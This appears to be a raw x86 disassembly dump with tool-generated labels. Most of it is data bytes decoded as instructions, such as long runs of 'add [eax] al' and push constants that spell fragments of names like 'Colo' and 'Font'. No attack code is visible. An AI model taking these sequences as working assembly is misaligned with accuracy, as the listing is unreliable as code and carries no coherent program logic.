imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ 0x4ff0000 ] cl
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
add [ eax + 0x55 ] cl
inc ecx
add [ eax + eax ] cl
add bh bh
int3
and eax 0x180043
add bh bh
pop eax
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x694d0800
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub al 0x0
push ebx
sub_43396d
add eax 0xc7880045
inc esp
add [ esi + ecx * 8 ] bl
inc esp
add [ ebx + ebx * 8 - 0x754fffbc ] bh
inc ebx
add [ eax + ebx * 8 - 0x736fffbc ] ah
inc ebx
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
add [ eax ] dl
fild [ eax + eax + 0x78 ]
mov es [ ebx ]
xor [ edi ] al
inc ebp
add [ eax ] al
in eax 0x44
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ eax - 0x3b ] cl
inc ebx
add [ eax - 0x27ffbc65 ] bh
xchg esi eax
inc ebx
add [ esp + ebp * 4 - 0x3a6fffbd ] ah
inc ebx
add al dh
retn
sub_433a46
fcos
lodsb [ esi ]
dec esp
xchg edi eax
inc ebx
add al dh
xchg edi eax
inc ebx
add [ eax + esi * 4 ] cl
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ eax ] al
lahf
inc ebx
add [ eax + edi * 4 ] bh
inc ebx
add [ eax + ebx * 4 ] dl
inc ebx
add [ eax - 0x65 ] ch
inc ebx
add [ ecx + eax * 8 ] cl
inc ebx
add [ esi + eax * 8 + 0x43 ] dl
add [ ebx + edi * 4 ] dh
inc ebx
add [ eax - 0x45 ] ch
inc ebx
add [ eax - 0x3f ] al
inc ebx
add [ eax - 0x3d ] bh
inc ebx
add al dh
lds eax [ ebx ]
or al 0xad
inc ebx
add ah al
lodsd [ esi ]
inc ebx
add [ ebp + ebp * 4 + 0x43 ] dl
add al al
stosd [ edi ]
inc ebx
add [ esp + ebp * 4 ] dh
inc ebx
add [ esp + ebp * 4 + 0x43 ] dl
add [ ebp + ebp * 4 - 0x501fffbd ] cl
inc ebx
add [ edi + ebp * 4 ] cl
inc ebx
add al dh
lodsd [ esi ]
inc ebx
add al bh
retn 0x43
sub_433bcd
add eax 0xc7880045
inc esp
add [ esi + ecx * 8 ] bl
inc esp
add [ ebx + ebx * 8 - 0x754fffbc ] bh
inc ebx
add [ eax + ebx * 8 - 0x736fffbc ] ah
inc ebx
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
add [ eax ] dl
fild [ eax + eax + 0x78 ]
mov es [ ebx ]
xor [ edi ] al
inc ebp
add [ eax ] al
in eax 0x44
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ eax - 0x3b ] cl
inc ebx
add [ eax - 0x27ffbc65 ] bh
xchg esi eax
inc ebx
add [ esp + ebp * 4 - 0x3a6fffbd ] ah
inc ebx
add al dh
retn
sub_433c22
inc ebx
add [ esp + eax * 8 ] ch
inc ebx
add [ eax - 0x3fffbc3c ] ah
push esi
inc ebp
add [ ebp + eax * 8 + 0x43 ] dl
add [ esi + ebx * 4 + 0x43 ] bh
add [ eax ] ah
xchg edi eax
inc ebx
add [ eax - 0x13ffbc64 ] dh
pushfd
inc ebx
add [ eax + 0x43bd ] ch
mov esi 0xbe700043
inc ebx
add [ eax - 0x3e ] ch
inc ebx
add al ch
mov esi 0x9be00043
inc ebx
add [ eax ] cl
pushfd
inc ebx
add [ esp + ebx * 4 + 0x43 ] dl
add [ esp + ebx * 4 + 0x43 ] bh
add [ eax - 0x1bffbc44 ] ah
0x54090043 0x694c
jae r-xdata
xchg edi eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410700
push esi
imul esp [ ebp + 0x77 ] 0x3c80c08b
inc ebx
add [ edi ] al
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
pushad
add [ eax + 0x3c00416e ] dh
add [ eax ] al
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
push cs
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
outsd
arpl [ edx + 0x79 ] ax
push esp
dec esi
inc esp
add [ ecx ] ah
add bh bh
je r-xdata
pop es
inc ecx
insb
push esi
imul esp [ ebp + 0x77 ] r-xdata
int3
add [ gs : eax ] eax
jmp [ eax + 0x14 ]
je r-xdata
add [ eax ] al
add [ ecx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
inc esp
add [ edx + 0x1 ] ah
add bh bh
xor [ eax * 2 + 0x100 ] dl
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xac65646f
in eax dx
inc ebp
add [ edx + eax ] dl
insb
dec edi
jne r-xdata
add [ eax ] al
add [ edx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ eax - 0xfffffb ] al
sbb [ eax ] al
jb r-xdata
add bh bh
mov al 0x96
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
adc eax 0x6f420b00
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0x80ff0001
adc al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
pop esp
inc esp
add [ ebx + 0x1 ] ah
add bh bh
in al dx
adc eax [ ebp ]
add [ eax ] eax
insd
sub [ ebx ] al
cmp al 0x2
add bh bh
aam 0xb1
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
jo r-xdata
je r-xdata
push 0x7473726f
pop ebp
pop ebp
inc esp
add [ ebp + 0x1 ] ah
add bh bh
pushad
adc al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
add bh bh
hlt
inc esp
adc al 0x47
outsb
jae r-xdata
add eax 0x6f6c6f43
jb r-xdata
add bh bh
rcr [ edi - 0x6023ffbc ] 0x44
add [ eax ] al
add [ eax ] al
add [ 0x18ff0000 ] 0x0
outsd
insb
jne r-xdata
add [ eax ] eax
insb
int3
sbb [ eax ] eax
pop es
inc ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
pop esp
inc esp
add [ ecx + eax ] ah
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax 0x72440a00
popad
inc ebx
jne r-xdata
adc [ eax ] al
sub al [ edx ]
add bh bh
les edx [ esi + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or eax [ ebx + 0x6f ]
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
call [ edi + ebx * 4 ]
jae r-xdata
jb r-xdata
outsb
inc ebx
xchg ebp eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
adc [ eax ] al
jne r-xdata
inc esp
add [ edi + ebx * 4 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040021 ] al
add bh bh
adc al 0x9f
jb r-xdata
lahf
outsd
insb
imul esp [ ebx + 0x6b ] r-xdata
je r-xdata
jae r-xdata
mov [ esi + 0x10043 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al [ eax ]
push cs
add bh bh
outsd
outsb
jae r-xdata
dec ebp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ edx ] cl
inc ebx
push 0x626b6365
outsd
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax 0x700042
add [ eax ] bh
add al [ eax ]
call [ eax + 0x100439a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
outsd
outsb
je r-xdata
and [ ecx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ edx + eax ] dh
add bh bh
mov eax 0x100439a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490b0029 ] al
jb r-xdata
js r-xdata
add [ eax ] dl
inc eax
add [ esi + 0x2 ] dh
add bh bh
pushfd
xchg esi eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
inc esi
insb
popad
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
push ds
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x5cff0001 ] ah
or [ ebp ] al
or [ eax ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
je r-xdata
inc esp
add al [ eax ]
push [ esi + edx * 4 ]
inc ebx
imul ebp [ edi + 0x6e ] 0x43296473
add [ edx + eax ] ch
dec edi
jo r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or ecx [ ecx + 0x63 ]
outsd
outsb
arpl [ ebx + 0x28 ] bp
inc ebx
add [ ecx + 0x2 ] bh
add bh bh
or al 0x96
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ esi ] cl
dec eax
outsd
je r-xdata
clc
xchg ebp eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
add [ eax ] al
add [ es : eax ] cl
dec eax
outsd
je r-xdata
add [ eax ] al
and eax 0x69480d00
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + 0x2 ] bh
add [ bx + si ] dl
inc eax
add [ edi + 0x2 ] dh
add bh bh
in al 0x95
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
or [ edi + 0x72 ] eax
imul esp [ esp + ecx * 2 + 0x69 ] 0x73656e
adc [ eax ] al
cmp [ edx ] al
add bh bh
nop
0x10043 0x0
add [ eax ] al
add [ eax + 0x1 ] al
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp + edx + 0x47 ]
popad
dec edi
outsb
insb
jns r-xdata
popad
je r-xdata
outsb
jb r-xdata
add [ 0x774f0900 ] ch
insd
jae r-xdata
add bh bh
enter 0x43b1 0x0
rol dl 0x43
sub [ fs : ebx ] eax
sub al 0x2
jb r-xdata
adc [ eax ] al
jpe r-xdata
or [ edx + 0x6f ] edx
ja r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x2 ] al
add bh bh
pushad
xchg esi eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ cs : ecx ] cl
dec edi
ja r-xdata
jae r-xdata
insb
inc ebp
add [ eax ] bl
add al [ eax ]
[ edx + esi * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905002a ] al
je r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
je r-xdata
add bh bh
jb r-xdata
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] eax
push cs
inc edx
jb r-xdata
adc [ eax ] al
sub [ edx ] al
add bh bh
hlt
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ ecx + 0x72 ]
dec ecx
insd
popad
jae r-xdata
add [ eax ] eax
insb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax 0x774f0900
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] al
adc [ eax ] al
pop ecx
add [ eax ] al
dec [ edi + ebx * 4 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax [ eax ]
or dl [ eax + 0x61 ]
add [ eax ] al
add [ eax + 0x1 ] al
outsb
je r-xdata
push ebx
jb r-xdata
arpl [ edi + 0x6e ] bp
add [ ebx ] cl
dec ecx
adc [ eax ] al
lodsb [ esi ]
retn 0x43
add [ eax + 0x1 ] al
outsb
je r-xdata
add [ ecx ] al
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ ebx ] dh
add [ edx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
jmp esp
push eax
popad
jb r-xdata
add [ esi ] cl
ja r-xdata
or edx [ ebx + 0x6d ]
outsb
dec eax
popad
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jb r-xdata
inc ecx
jb r-xdata
jb r-xdata
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
push ss
add al [ eax ]
jmp [ edx + ebx * 4 + 0x10043 ]
add bh bh
test [ ebx + 0x10043 ] dh
sbb [ ebx ] al
sub [ edx ] eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
inc ebx
add [ ecx ] ch
add al [ eax ]
call [ edx + esi * 4 ]
add [ eax ] dl
inc eax
add [ edx + eax - 0x3ecb0100 ] dl
inc ebx
push 0x6948776f
outsb
je r-xdata
jo r-xdata
xor al 0x0
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
0x94ff0000 0x449f
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
[ eax ]
push esp
jns r-xdata
or [ ebx + 0x6f ] dl
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
aaa
add [ 0x776f6853 ] cl
push edi
rol [ ebx ] 0x1
mov es [ ebp ]
jl r-xdata
or [ esi + 0x69 ] edx
dec ecx
insd
popad
jae r-xdata
jae r-xdata
popad
insb
insb
dec ecx
insd
popad
jae r-xdata
insb
inc ebp
add [ edx + eax ] bl
add bh bh
or al 0xb3
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530b0039 ] al
insd
ja r-xdata
outsb
jne r-xdata
adc eax 0x28ff0002
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or edx [ ebx + 0x74 ]
popad
and al 0x6c
inc ebp
add [ eax ] ah
add al [ eax ]
inc [ ebx + esi * 4 + 0x10043 ]
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
inc esp
add [ eax ] bh
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080038 ] al
jo r-xdata
add bh bh
fcomp [ ebp + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6f500900
popad
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530b003b ] al
je r-xdata
dec ebp
inc esp
add [ eax + 0x38004508 ] bh
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
cmp al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
add bh bh
adc al 0xb2
outsd
jb r-xdata
add [ ss : ecx ] dl
push ebx
push 0x6f43776f
insb
jne r-xdata
adc [ eax ] al
sub eax [ edx ]
add bh bh
xor al 0x97
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
popad
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] bl
dec edi
xor al 0x43
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f180041 ] al
outsb
inc ecx
jbe r-xdata
jne r-xdata
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc eax
popfd
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
aas
add [ edi ] al
push esi
insb
add [ eax ] al
add [ ecx ] cl
push esi
imul esp [ ebp + 0x77 ] 0x6c797453
add [ eax ] al
je r-xdata
imul esi [ ebx + 0x69 ] 0xb4656c62
xor eax [ ebx ]
test al 0x2
add bh bh
test al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ edi + ecx * 2 ] dl
outsb
inc ecx
jbe r-xdata
jb r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
add [ 0x6f436e4f ] cl
insb
jne r-xdata
je r-xdata
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
je r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
mov esp 0x44be
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
outsb
inc ebx
push 0x65676e61
mov [ edi ] ch
inc ebx
add [ eax ] cl
dec edi
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
outsb
inc ebx
push 0x69676e61
outsb
add al 0x57
inc ecx
add [ eax ] ah
je r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ecx
add [ ecx ] cl
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ edi ] cl
dec edi
outsb
inc ebx
outsd
insb
jne r-xdata
outsb
dec edi
insd
inc esp
jb r-xdata
das
insd
inc esp
jb r-xdata
add [ eax ] al
insd
inc esp
jb r-xdata
ja r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sub al 0x43
add [ 0x28ff0002 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10004c ] al
jb r-xdata
add [ eax ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
ja r-xdata
popad
ja r-xdata
add al cl
add al [ eax ]
dec eax
add al [ eax ]
ja r-xdata
add [ edx ] cl
je r-xdata
outsb
inc ebx
jne r-xdata
add [ eax ] al
or [ eax + eax + 0x10 ] 0x4f
loopne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebp
add [ ebx ] dl
dec edi
js r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ esi ] cl
dec edi
inc esp
xor [ ebx ] al
loopne r-xdata
add [ eax ] eax
jmp [ eax ]
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edx
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
sub [ ebx ] al
add bh bh
sub [ ebx ] al
add bh bh
inc esi
imul ebp [ esi + 0x64 ] r-xdata
sbb [ ebx ] al
add bh bh
sbb [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
or [ edi ] 0xa
insd
inc esp
jb r-xdata
clc
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax + 0x4f0e004a ] al
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
je r-xdata
inc ebx
jne r-xdata
push eax
outsd
jo r-xdata
loopne r-xdata
add bh bh
add [ eax + 0x4f070045 ] al
dec ecx
je r-xdata
inc [ ecx ]
outsb
inc ecx
jbe r-xdata
insd
in al 0x34
inc ebx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f1b0042 ] al
imul esi [ ecx + ebp * 2 + 0x6e ] 0x44524c67
outsd
outsb
mov esp 0x30004331
add eax [ eax ]
push [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
add [ edx ] cl
dec edi
outsb
inc esp
insb
je r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
and [ ebx ] al
add bh bh
and [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ecx
add [ ecx ] dl
outsb
inc esp
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004f ] al
ja r-xdata
inc esp
insd
inc esp
jb r-xdata
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec eax
add [ edx ] dl
dec edi
outsb
inc ebx
outsd
insb
jne r-xdata
add bh bh
inc ebx
insd
xor [ edi ] ch
inc edi
je r-xdata
add al 0x57
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070059 ] al
outsb
inc ebp
outsb
je r-xdata
outsb
add [ eax ] al
adc [ edi ] 0x9
dec edi
ja r-xdata
outsb
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esp
add [ edx ] cl
dec edi
push ebx
je r-xdata
dec esi
add [ esi ] al
dec edi
je r-xdata
outsb
add [ eax ] 0x0
add [ eax + 0x4f0a0050 ] al
ja r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esp
add [ eax ] dl
dec edi
xor al [ ebx ]
add [ eax ] al
or [ ebx ] 0xc
dec edi
outsb
inc ebx
jne r-xdata
outsb
inc ebx
outsd
insd
jo r-xdata
outsb
push edx
imul esp [ edi + 0x68 ] 0x696c4374
arpl [ ebx - 0x60 ] bp
xor [ ebx ] al
call 0xffffffffe94245b2
add [ eax ] al
add [ eax + 0x4f0a005d ] al
insd
popad
dec ecx
outsb
js r-xdata
add [ ecx ] dl
dec edi
jb r-xdata
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090057 ] al
dec esp
push edx
inc esp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0054 ] al
je r-xdata
dec edi
outsb
inc esp
popad
je r-xdata
adc [ ecx ] 0x11
call 0x104389cf
add eax [ eax ]
call [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
outsb
insd
sbb [ ebx ] dh
inc ebx
add [ eax ] al
add eax [ eax ]
inc [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13004d ] al
[ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne r-xdata
outsb
inc esp
popad
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f06004e ] al
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f080060 ] al
outsb
dec ecx
outsb
jae r-xdata
inc esp
jb r-xdata
outsb
inc ebp
js r-xdata
outsb
inc edi
je r-xdata
aaa
inc ebx
add [ eax + 0x3 ] dl
add bh bh
push eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f11005c ] al
jb r-xdata
jne r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005a ] al
push edi
inc ecx
add al cl
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090058 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
insd
loopne r-xdata
add [ eax ] al
adc [ eax + eax + 0xa ] 0x4f
inc ebx
push 0x65676e61
add al 0x57
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
push eax
add [ edx ] cl
dec edi
dec ecx
je r-xdata
add [ eax ] al
insd
inc esp
jb r-xdata
pop es
dec edi
jb r-xdata
inc esp
add al bl
add [ eax ] eax
jo r-xdata
outsb
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
pop ebp
add [ edx ] cl
dec edi
je r-xdata
cmp [ ebx ] al
pop eax
add eax [ eax ]
[ eax + 0x3 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop edi
add [ ecx ] cl
outsb
dec ecx
outsb
outsw
push esp
imul esi [ eax + 0x48 ] 0x6000432e
add eax [ eax ]
jmp [ eax + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09005f ] al
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090056 ] al
outsb
inc ebp
imul esi [ fs : ecx + ebp * 2 + 0x6e ] 0x44524c67
inc ebx
add [ eax ] bh
add eax [ eax ]
popad
insd
movsb [ edi ] [ esi ]
xor eax 0x3080043
add bh bh
or [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
ja r-xdata
loopne r-xdata
